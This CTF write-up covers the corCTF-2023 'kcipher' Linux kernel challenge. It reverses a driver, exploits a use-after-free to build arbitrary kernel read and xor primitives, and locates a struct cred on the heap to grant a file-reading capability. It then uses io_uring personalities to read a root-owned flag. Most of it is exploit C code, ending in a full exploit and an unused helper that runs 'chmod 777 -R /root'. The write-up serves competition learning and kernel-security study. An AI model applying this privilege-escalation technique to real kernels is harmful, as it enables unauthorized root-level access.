---
layout: post
title: "Kcipher CoRCTF-2023: cross-slab heap traversal for cred structure"
---

![](/assets/images/2023-09-26-KCIPHER-CORCTF/cover.png)
We are going to discuss 'kcipher' problem from recent corCTF-2023. As its name suggests it was a kernel pwning chal. 
The bug was classic. The funniest part was exploitation.
Many different solutions exist and different bypasses to pitfalls were created by different people. 

Stay tuned!

## Reversing
No sources were provided. 
After a little bit of rev we figure out the module mainly operates with this kind of structure:
```c
struct kcipher {
    int ciph_id; // type of cipher; 1 for xor
    int byt; // byte to xor with
    uint64_t size; // size of data to cipher
    uint64_t str;  // base address of data to cipher
    uint32_t lock; // spinlock
    char ciph[0x44]; // cipher name
};
```

Which is created and set up inside the function `device_ioctl(cmd=-0x12411100)`.
```c
long device_ioctl(void *param_1,int cmd,undefined8 arg)

{
  // ...
  
  if (cmd == -0x12411100) {
    kciph = (struct kcipher *)kmalloc_trace(___unregister_chrdev,0x400dc0,0x60);
    // ...
      fd = anon_inode_getfd("kcipher-buf",kcipher_cipher_fops,kciph,2);
      if (fd < 0) {
        kfree(kciph);
        return (long)fd;
      }
      lVar1 = _copy_from_user(kciph,arg,8);
      if (lVar1 == 0) {
        if (kciph->ciph_id < 4) {
          strncpy(kciph->ciph,(&ciphers)[kciph->ciph_id],0x40);
          return (long)fd;
        }
        lVar1 = -0x16;
      }
      kfree(kciph);
    }
  return lVar1;
}

```
As we can see it allocates `struct kcipher` and creates the "anon" file with 
[`file->private_data := allocated struct kcipher`](https://elixir.bootlin.com/linux/v6.5-rc1/source/fs/anon_inodes.c#L226)

Then on userland we can interact with file using `read`/`write` to the returned fd.

Also notice the `copy_from_user(kciph, arg, 8)` lets us to control the `ciph_id` and `byt` fields of allocated `struct kcipher`. 
They both are responsible for controlling the type of ciphering function used in `cipher_read()`.

Fields `struct kcipher->str` and `->size` are not set up here. The job is done in `cipher_write():`
```c
undefined8 cipher_write(long filp,undefined8 user_buf,ulong count)

{
  undefined8 flags;
  char *str;
  undefined8 uVar1;
  struct kcipher *kciph;
  uint *lock_p;
  
  kciph = *(struct kcipher **)(filp + 0xc0);
  if (count < 0x1001) {
    lock_p = &kciph->lock;
    flags = _raw_spin_lock_irqsave(lock_p);
    if (kciph->str != (char *)0x0) {
      kfree(kciph->str);
      kciph->str = (char *)0x0;
    }
    str = (char *)__kmalloc(count,0xcc0); // here
    kciph->str = str; // here
    if (str != (char *)0x0) {
      kciph->size = count; // here
      uVar1 = strncpy_from_user(str,user_buf,count); // here
      _raw_spin_unlock_irqrestore(lock_p,flags);
      return uVar1;
    }
    _raw_spin_unlock_irqrestore(lock_p,flags);
  }
  return 0xfffffffffffffff4;
}

```

Okay looks fine. Let's get into `cipher_read`

```c
long cipher_read(long filp,undefined8 user_buf,ulong count)

{
  undefined8 flags;
  long lVar1;
  struct kcipher *kciph;
  uint *lock_p;
  
  kciph = *(struct kcipher **)(filp + 0xc0);
  lock_p = &kciph->lock;
  flags = _raw_spin_lock_irqsave(lock_p);
  if (kciph->str == (char *)0x0) {
    lVar1 = -2;
    _raw_spin_unlock_irqrestore(lock_p,flags);
  }
  else {
    do_encode(kciph);  // applies cipher to kcipher->str
    if (kciph->size < count) {
      count = kciph->size;
    }
    if (0x7fffffff < count) {
      do {
        invalidInstructionException();
      } while( true );
    }
    lVar1 = _copy_to_user(user_buf,kciph->str,count);
    lVar1 = count - lVar1;
    _raw_spin_unlock_irqrestore(lock_p,flags);
  }
  return lVar1;
}
```

As wee see it just calls `do_encode()` function which does the requested ciphering:
```c

void do_encode(struct kcipher *kciph)

{
  ulong idx;
  char *str;
  char cur_char;
  uint dispatch;
  
                    /* encodes kciph->str byte-wise
                       (len unchanged) */
  dispatch = kciph->idx_cipher;
  str = kciph->str;
  if (dispatch == 2) {
      //....
  }
  if (dispatch < 3) {
    if (dispatch == 0) {
                    /* dispatch == 0, add(rot) */
      //...
    }
                    /* dispatch == 1, xor */
    idx = 0;
    if (kciph->size == 0) {
      return;
    }
    do {
      str[idx] = str[idx] ^ kciph->byt;
      idx = idx + 1;
    } while (idx < kciph->size);
    return;
  }
  if (dispatch != 3) {
    if (dispatch != 4) {
      //...

```

## The Bug
Let's look closer into the `device_ioctl` function. Mainly these lines:
```c
  // ...
  
  if (cmd == -0x12411100) {
    kciph = (struct kcipher *)kmalloc_trace(___unregister_chrdev,0x400dc0,0x60);
    // ...
      fd = anon_inode_getfd("kcipher-buf",kcipher_cipher_fops,kciph,2);
      // ...
      lVar1 = _copy_from_user(kciph,arg,8);
      if (lVar1 == 0) {
        if (kciph->ciph_id < 4) { // oh
          strncpy(kciph->ciph,(&ciphers)[kciph->ciph_id],0x40);
          return (long)fd;
        }
        lVar1 = -0x16;
      }
      kfree(kciph); // oh
      // no dangling reference cleaning is done... oh
    }
  return lVar1;
```

The function calls `kfree(kciph)` if we submit `kciph->ciph_id=5`. 
But the reference `filp->private_data` is not cleared, file is not deleted, so we still can access it from userland with `read/write`!. Classic UAF.

The only caveat is in that case we don't get returned `fd` to the "anon" file. 
But it can be easily predicted: it is the `"max value of file descriptor in your program" + 1`. On mine its 4: 0, 1, 2 for stin, stdout, stderr and 3 for `/dev/kcipher`.
Checked in practice.

## Taking the control

The first idea came to mind was to use `setxattr` to take control of dangling reference. Unfortunately it was disabled in provided kernel.

So we need to figure out another way to take ownership of our dangling reference.

Lucky for us, the function `cipher_write` makes allocation with `kmalloc` providing user-defined size:
```c 
undefined8 cipher_write(long filp,undefined8 user_buf,ulong count)

{
  undefined8 flags;
  char *str;
  undefined8 uVar1;
  struct kcipher *kciph;
  uint *lock_p;
  
  kciph = *(struct kcipher **)(filp + 0xc0);
  if (count < 0x1001) {
    // ...
    str = (char *)__kmalloc(count,0xcc0);
    kciph->str = str;
    if (str != (char *)0x0) {
      kciph->size = count;
      uVar1 = strncpy_from_user(str,user_buf,count);
      //...
```

If we specify `count=sizeof(struct kcipher)=0x60` the `kmalloc` will allocate the dangling reference. So we have `kciph->str:=dangling struct kcipher`.

The function `strncpy_from_user` is kinda annoying because it is going to stop copying as soon as it encounters `0x00`-byte.
So the overwritten `struct kcipher` should not contain 0x00-bytes. It is inappropriate for us because then `kciph->ciph_id` would have some 
big value and we won't be able to perform any kind of operation since `do_encode()` validates the value of `ciph_id`.

Here is how we can handle it. Imagine we have a data which contains null-bytes. Let's xor it on userland before submitting to kernel. 
So we xor it with byte it does not contain (0x41 was good in my case). Now the data does not contain null-bytes.
We can submit it to kernel with `cipher_write` to another pre-created `cipher` file. It will set `kciph->str=another_kciph_but_invalid_since_xored_0x41`.
If now we have `kciph->byt=0x41`, we can use `read()` on it which will xor the data again with byte 0x41 (so, de-xor it!). Exactly as needed.

So we have a control of dangling `struct kcipher`. Soooo much can be done now.

## Constructing primitives

### Basic setup
```c
void basic_setup() {
    //... 
    struct kcipher_req kciph = {
        .ciph_id = 1, // xor
        .byt = 0x41, // does not change the contents
    };

    puts("[*] setup cfd[0]");
    EXIT_ON_ERR(ioctl(fd, -0x12411100, &kciph) < 0); // should be ok
    cfd[0] = cfd_next++; // predicted

    struct kcipher fake = {
        .ciph_id = 1, // xor
        .byt = 0x43,  // for read: does not change contents
        .size = 0x1000,  // size_t
        .str = 0x0, // arb addr, will be overwritten
        .lock = 0x0
    };

    // kfree(kciph of cfd[1])
    puts("[*] setup cfd[1], trigger kfree");
    kciph.ciph_id = 5; // trigger kfree in device_ioctl
    ioctl(fd, -0x12411100, &kciph); // returns <0 but who gives a damn
    cfd[1] = cfd_next++; // predicted

    xor((char*)&fake, 0x41, sizeof(fake));
    puts("[*] set cfd[0]->str := cfd[1], overwrite `struct kcipher` of cfd[1]");
    EXIT_ON_ERR(write(cfd[0], &fake, sizeof(fake)) < 0);
    
    struct kcipher kcipher_cfd1;
    puts("[*] read (cfd[0]): de-xor cfd[1]");
    prompt();
    EXIT_ON_ERR(read(cfd[0], &kcipher_cfd1, sizeof(kcipher_cfd1)) < 0);

    // kfree(kciph of cfd[2])
    puts("[*] setup cfd[1]->str := cfd[2]");
    kciph.ciph_id = 5; // trigger kfree in device_ioctl
    ioctl(fd, -0x12411100, &kciph); // returns <0 but who gives a damn
    cfd[2] = cfd_next++; // predicted

    char buf[0x200];
    memset(buf, 'X', sizeof(buf));
    EXIT_ON_ERR(write(cfd[1], &buf, sizeof(buf)) < 0); // does not matter what to write, just link cfd[1]->str := cfd[2]
}
```

I'll just comment on that one. It sets up `cfd[0]->str := cfd[1]`. And `cfd[1]->str := cfd[2]`. So we control `cfd[1]` from `cfd[0]` and `cfd[2]` from `cfd[1]`.

It is important to note that `read()` from `cfd[0]` 0x41-xors the `cfd[1]`. So we need to always make the `read(cfd[0])` 2 times so `cfd[1]` is never invalidated.
But `cfd[1]->byt=cfd[2]->byt=0x00`. So `read` from them is fine and need not to be called twice.



### Arbitrary "read"
To construct arbitrary read we can just set up `kciph->str=desired_addr`, `kciph->size=desired_size`, `kciph->byt=0x00`, `kciph->ciph_id=1`.
The idea is that `cipher_read` will xor the data with 0x00, which won't change it. Result will be submitted to userland, so we can "read".

```c
void arbread(uint64_t addr, char* buf, uint64_t size) {
    // requires cfd[1]->str = cfd[2], cfd[1]->byt=0x43
    struct kcipher fake = {
        .ciph_id = 1, // xor
        .byt = 0x00,  // for read: does not change contents
        .size = size,  // size_t
        .str = addr, 
        .lock = 0x0
    };

    xor(&fake, 0x43, sizeof(fake));
    EXIT_ON_ERR(write(cfd[1], &fake, sizeof(fake)) < 0);
    // de-xor
    struct kcipher fake_in_kernel;
    EXIT_ON_ERR(read(cfd[1], &fake_in_kernel, sizeof(fake_in_kernel)) < 0);
    assert(fake_in_kernel.str == addr);
    assert(fake_in_kernel.size == size);
    assert(fake_in_kernel.byt == 0);

    EXIT_ON_ERR(read(cfd[2], buf, size) < 0);
}
```

**P. S.** 

As a side to note we can't say we constructed the arb. "read". It actually is a non-changing "write" because it does xor on data(even if nothing is changed).
And it does matter because we won't be able to "read" from read-only memory sections.

@clubby789 noted that we can construct the **real** arb. read(with the ability to read read-only memory locations) by setting `ciph_id=5` so that 
dispatch validation in `do_encode` returns warning and not touches the memory. It does not raise error and still does `copy_to_user` so we are getting the data.

### Arbitrary "xor"
For fun let's construct the arbitrary xor. This primitive would xor exactly 1 desired byte with 1 byte provided by us. 

Just set `kciph->str=desired_addr`, `kciph->size=1`, `kciph->byt=byte_to_xor_with`, `kciph->ciph_id=1`.

```c
char arbxor(uint64_t addr, char byt) {
    struct kcipher fake = {
        .ciph_id = 1, // xor
        .byt = byt,  // for read: does not change contents
        .size = 1,  // size_t
        .str = addr, // arb addr, will be overwritten
        .lock = 0x0
    };

    xor(&fake, 0x43, sizeof(fake));
    EXIT_ON_ERR(write(cfd[1], &fake, sizeof(fake)) < 0);
    // de-xor
    struct kcipher fake_in_kernel;
    EXIT_ON_ERR(read(cfd[1], &fake_in_kernel, sizeof(fake_in_kernel)) < 0);
    assert(fake_in_kernel.str == addr);
    assert(fake_in_kernel.size == 1);
    assert(fake_in_kernel.byt == byt);


    char newbyte;
    EXIT_ON_ERR(read(cfd[2], &newbyte, 1) < 0);
    return newbyte;
}
```

### Arbitrary "write" (not needed for this exploitation)
Our 2 primitives can be transformed into arbitrary write. My exploit didn't need it. Still let's quickly discuss how to "arbwrite" in case it's suitable for your exploitation. 
All you need is firstly to `current_byte = arbread(desired_addr, size=1)`. Then you do `arbxor(desired_addr, current_byte ^ desired_byte)`.

## Exploitation
It all came down to this part.

### kheap leak
Leaking kheap is easy after our `basic_setup`: `cfd[0]->str := cfd[1]`, `cfd[1]->str := cfd[2]`. As soon as `read(cfd[0])` the returned data is actually the `struct kcipher` of `cfd[1]`.
So `((struct kcipher*)data)->str` is the pointer to `struct kcipher` of `cfd[2]` which is allocated on kheap.

### io_uring
The technique came from author's solution of 'flipper' problem from recent zer0pts-2023. We set up `struct cred` on heap, then poison it setting `cred->cap_effective=CAP_DAC_READ_SEARCH`(=0x02) 
which lets user with this `cred` to read/write from arbitrary files by using `io_uring` and setting `sqe->personality=poisoned_personality`.

How do we find the address of `struct cred` to poison it? For security reasons it has it's own slab so we won't be able to allocate it with `kmalloc` in cipher_write(even if it kfree'd).

But wait... we have a arbitrary read. And we have a kernel heap pointer. Why not to just traverse all down the heap until we found one! 

To make search simpler, let's allocate maaany of `struct cred`s (0xffff is the max number). 
```c
void alloc_n_creds(struct io_uring* ring, size_t n_creds) {
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct __user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* allocate new cred */
        EXIT_ON_ERR(syscall(SYS_capset, &cap_hdr, (void *)cap_data) < 0);

        /* register it for later use with io_uring */
        EXIT_ON_ERR((personalities[i] = io_uring_register_personality(ring)) < 0);
    }
}
```

Then we can traverse the heap with our `arbread()` to find at least one of allocated `struct cred`s: 
we just iterate from leaked kheap address and as soon as we see the `0x3e8000003e8` it most probably is uid/euid of the of some `struct cred`. 

Now poison this cred at offset 0x38(`cap_effective`) with `arbxor()`. Voila.

It remains to use the poisoned `cred`. We just iterate over all registered `personalities` and try to call `openat` with `io_uring`. 

All but one of them will fail. 
One which corresponds to poisoned `struct cred` will succeed. 
So as soon as we hit the right one the `cqe->res` will return the flag file descriptor.
```c
int flag_fd;
for (size_t i = 0; i < N_CREDS; ++i) {
    struct io_uring_sqe* sqe = io_uring_get_sqe(&ring);
    io_uring_prep_openat(sqe, -1, "/root/flag.txt", O_RDONLY, 0);
    sqe->personality = personalities[i];

    io_uring_submit(&ring);

    struct io_uring_cqe* cqe;
    io_uring_wait_cqe(&ring, &cqe);

    if (cqe->res >= 0) {
        puts("[*] !!!!!!!!! SUCCESS");
        flag_fd = cqe->res;
        break;
    }

    io_uring_cqe_seen(&ring, cqe);
}

if (flag_fd > 0) {
    char flag[0x40] = {0};
    read(flag_fd, flag, sizeof(flag));
    printf("%s\n", flag);
} else {
    printf("failed to gain the flag\n");
}
```


### Full exploit

```c
#include <stdio.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/fcntl.h>
#include <string.h>
#include <sys/xattr.h>
#include <assert.h>

#include <liburing.h>
#include <sys/capability.h>
#include <sys/syscall.h>

#include <sys/types.h>
#include <sys/shm.h>

// no-SMEP?, no-SMAP?, KASLR

#define N_CREDS 0xffff
int personalities[N_CREDS];


#define EXIT_ON_ERR(err_cond) \
    if (err_cond) { \
        perror("[***] " #err_cond); \
        exit(1); \
    }

void prompt();

int fd;
int cfd[10];

struct kcipher_req {
    int ciph_id;
    char byt;
};

struct kcipher {
    int ciph_id;
    int byt;
    uint64_t size;
    uint64_t str;
    uint64_t lock;
    char ciph[0x40];
};

#define display_kcipher(kciph_buf, kciph_name) \
    printf("[*] " #kciph_name "->ciph_id = 0x%x,\n", kciph_buf->ciph_id); \
    printf("[*] " #kciph_name "->byt = 0x%x,\n", kciph_buf->byt); \
    printf("[*] " #kciph_name "->size = 0x%llx,\n", kciph_buf->size); \
    printf("[*] " #kciph_name "->str = 0x%llx\n", kciph_buf->str); 

void xor(char* p, char byt, size_t size);

uint64_t kheap;
uint64_t cred_addr;

void leak_kheap() {
    // requires cfd[0]->str = cfd[1], cfd[0]->byt=0x41
    // requires cfd[1]->str = some-kheap (cfd[2] for example)
    struct kcipher cfd1;
    read(cfd[0], &cfd1, sizeof(cfd1));
    read(cfd[0], &cfd1, sizeof(cfd1)); // de-xor
    kheap = cfd1.str;
    printf("[*] kheap: %llx\n", kheap);
}

void arbread(uint64_t addr, char* buf, uint64_t size) {
    // requires cfd[1]->str = cfd[2], cfd[1]->byt=0x43
    struct kcipher fake = {
        .ciph_id = 1, // xor
        .byt = 0x00,  // for read: does not change contents
        .size = size,  // size_t
        .str = addr, 
        .lock = 0x0
    };

    xor(&fake, 0x43, sizeof(fake));
    EXIT_ON_ERR(write(cfd[1], &fake, sizeof(fake)) < 0);
    // de-xor
    struct kcipher fake_in_kernel;
    EXIT_ON_ERR(read(cfd[1], &fake_in_kernel, sizeof(fake_in_kernel)) < 0);
    assert(fake_in_kernel.str == addr);
    assert(fake_in_kernel.size == size);
    assert(fake_in_kernel.byt == 0);

    EXIT_ON_ERR(read(cfd[2], buf, size) < 0);
}

char arbxor(uint64_t addr, char byt) {
    struct kcipher fake = {
        .ciph_id = 1, // xor
        .byt = byt,  // for read: does not change contents
        .size = 1,  // size_t
        .str = addr, // arb addr, will be overwritten
        .lock = 0x0
    };

    xor(&fake, 0x43, sizeof(fake));
    EXIT_ON_ERR(write(cfd[1], &fake, sizeof(fake)) < 0);
    // de-xor
    struct kcipher fake_in_kernel;
    EXIT_ON_ERR(read(cfd[1], &fake_in_kernel, sizeof(fake_in_kernel)) < 0);
    assert(fake_in_kernel.str == addr);
    assert(fake_in_kernel.size == 1);
    assert(fake_in_kernel.byt == byt);


    char newbyte;
    EXIT_ON_ERR(read(cfd[2], &newbyte, 1) < 0);
    return newbyte;
}

void find_cred() {
    // requires `kheap`

    uint64_t start = (kheap & ~0xfffff) + 0x100000;
    printf("[*] Searching for cred on kheap, start=0x%llx\n", start);

    prompt();
    uint32_t dump[0x2000];
    arbread(start, &dump, sizeof(dump));
    for (size_t i = 0; i < sizeof(dump) / sizeof(dump[0]); ++i) {
        uint64_t curptr = start + i * 4;
        printf("0x%llx: 0x%llx\n", curptr, dump[i]);
        if (dump[i] == 0x000003e8) {
            printf("[*] Found possibly cred: 0x%llx\n", curptr);
            cred_addr = curptr & ~0xf;
            return;
        }
    }
    exit(1);
}

static int cfd_next;

void basic_setup() {
    printf("sizeof(kcipher)=0x%x\n", sizeof(struct kcipher)); // basic eye-check in runtime
    fd = open("/dev/kcipher", O_RDONLY);
    printf("fd: %d\n", fd);
    cfd_next = fd + 1;

    prompt();

    struct kcipher_req kciph = {
        .ciph_id = 1, // xor
        .byt = 0x41, // does not change the contents
    };

    puts("[*] setup cfd[0]");
    EXIT_ON_ERR(ioctl(fd, -0x12411100, &kciph) < 0); // should be ok
    cfd[0] = cfd_next++; // predicted

    struct kcipher fake = {
        .ciph_id = 1, // xor
        .byt = 0x43,  // for read: does not change contents
        .size = 0x1000,  // size_t
        .str = 0x0, // arb addr, will be overwritten
        .lock = 0x0
    };

    // kfree(kciph)
    puts("[*] setup cfd[1], trigger kfree");
    kciph.ciph_id = 5; // trigger kfree in device_ioctl
    ioctl(fd, -0x12411100, &kciph); // returns <0 but who gives a damn
    cfd[1] = cfd_next++; // predicted

    xor((char*)&fake, 0x41, sizeof(fake));
    puts("[*] set cfd[0]->str := cfd[1], overwrite `struct kcipher` of cfd[1]");
    EXIT_ON_ERR(write(cfd[0], &fake, sizeof(fake)) < 0);
    
    struct kcipher kcipher_cfd1;
    puts("[*] read (cfd[0]): de-xor cfd[1]");
    prompt();
    EXIT_ON_ERR(read(cfd[0], &kcipher_cfd1, sizeof(kcipher_cfd1)) < 0);

    puts("[*] setup cfd[1]->str := cfd[2]");
    kciph.ciph_id = 5; // trigger kfree in device_ioctl
    ioctl(fd, -0x12411100, &kciph); // returns <0 but who gives a damn
    cfd[2] = cfd_next++; // predicted

    char buf[0x200];
    memset(buf, 'X', sizeof(buf));
    EXIT_ON_ERR(write(cfd[1], &buf, sizeof(buf)) < 0); // does not matter what to write, just link cfd[1]->str := cfd[2]
}

void modprobe_hax() {
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/roooot");
    system("chmod +x /tmp/roooot");
    system("echo -ne '#!/bin/sh\nchmod 777 -R /root\necho wiki' > /tmp/w\n");
    system("chmod +x /tmp/w");
    system("/tmp/roooot");
    return;
}

int main() {
    setbuf(stdout, 0);

    basic_setup();
    leak_kheap();

    struct io_uring ring;
    io_uring_queue_init(1, &ring, 0);
    alloc_n_creds(&ring, N_CREDS);

    find_cred();
    printf("[*] cred_addr: 0x%llx\n", cred_addr);

    puts("[*] flipping bit");
    arbxor(cred_addr + 0x38, 0x02); // CAP_DAC_SEARCH

    puts("[*] bruting creds");
    int flag_fd = -1;
    for (size_t i = 0; i < N_CREDS; ++i) {
        // printf("[*] personality: %d", personalities[i]);

        struct io_uring_sqe* sqe = io_uring_get_sqe(&ring);
        io_uring_prep_openat(sqe, -1, "/root/flag.txt", O_RDONLY, 0);
        sqe->personality = personalities[i];

        io_uring_submit(&ring);

        struct io_uring_cqe* cqe;
        io_uring_wait_cqe(&ring, &cqe);

        if (cqe->res >= 0) {
            puts("[*] !!!!!!!!! SUCCESS");
            flag_fd = cqe->res;
            break;
        } else {
            // printf("personality %d, error: %s\n", personalities[i], strerror(abs(cqe->res)));
        }

        io_uring_cqe_seen(&ring, cqe);
    }

    if (flag_fd > 0) {
        char flag[0x40] = {0};
        read(flag_fd, flag, sizeof(flag));
        printf("%s\n", flag);
    } else {
        printf("failed to gain the flag\n");
    }

    puts("[*] End");
    prompt();

    return 0;
} 

void prompt() {
    printf("Enter any key to continue: ");
    getchar();
}

void xor(char* p, char byt, size_t size) {
    char* end = p + size;
    while (p != end) {
        *p ^= byt;
        ++p;
    }
}

void alloc_n_creds(struct io_uring* ring, size_t n_creds) {
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct __user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* allocate new cred */
        EXIT_ON_ERR(syscall(SYS_capset, &cap_hdr, (void *)cap_data) < 0);

        /* increment refcount so we don't free it afterwards*/
        EXIT_ON_ERR((personalities[i] = io_uring_register_personality(ring)) < 0);
    }
}
```

Exploit is unstable because we make many unbacked assumptions. It works like 3/10 times. 

The most unstable point is how we find `struct cred` on kheap in `find_cred()` function.
And it's not the `0x3e8` part. It is how much should we read with `arbread()` beginning with `kheap` address so that we get `0x3e8` in our memory dump?
Tuning this part will make it much more reliable.


## About the CTF
The corCTF-2023 was great. Problems were hard to solve, technical help was on time. Really recommend next year:)

I was the last solver of this chal. Finished 1 hour before the end. TeamItaly were first and solved it in less than 3.5 hours!

Special Thanks to [@clubby789](https://github.com/clubby789) for this chal and technical help during ctf. 
Thanks to [@willsroot](https://github.com/BitsByWill) for technical help and naming of this writeup.

## Links
* [zer0pts-2023 'flipper' solution](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/pwn/flipper/solution)
